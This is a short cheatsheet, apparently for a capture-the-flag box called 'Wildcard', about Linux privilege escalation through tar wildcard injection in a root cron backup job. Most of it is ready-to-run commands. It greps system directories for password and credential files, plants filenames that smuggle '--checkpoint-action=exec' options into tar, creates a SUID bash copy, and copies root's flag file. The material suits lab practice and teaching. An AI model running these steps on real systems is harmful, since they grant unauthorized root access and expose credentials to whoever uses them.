# Cheatsheet — Wildcard

## Targets

- **cron01** — SSH + an aggressive backup schedule

## Useful commands

```bash
# loot + schedule recon
grep -rIlnE 'passw|cred' /var/backups /etc /opt 2>/dev/null
cat /etc/crontab; ls -la /etc/cron.d/ /etc/cron.hourly/
crontab -l; systemctl list-timers --all

# filenames as arguments — end-of-options discipline for yourself
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh /home/ops/pwn.sh'

# payload shapes people use
cp /bin/bash /tmp/rbash && chmod +s /tmp/rbash    # suid shell
cp /root/root.txt /tmp/ && chmod 644 /tmp/root.txt # direct flag grab
```

## Concepts

- `cmd *` expands to *filenames* — and names starting with `-` are treated as
  OPTIONS by most GNU tools
- `tar --checkpoint-action=exec=` runs a command mid-archive; a single
  checkpoint at position 1 is enough
- The writable surface is the *directory*, not the script — you don't need
  to modify root's code to change what it does
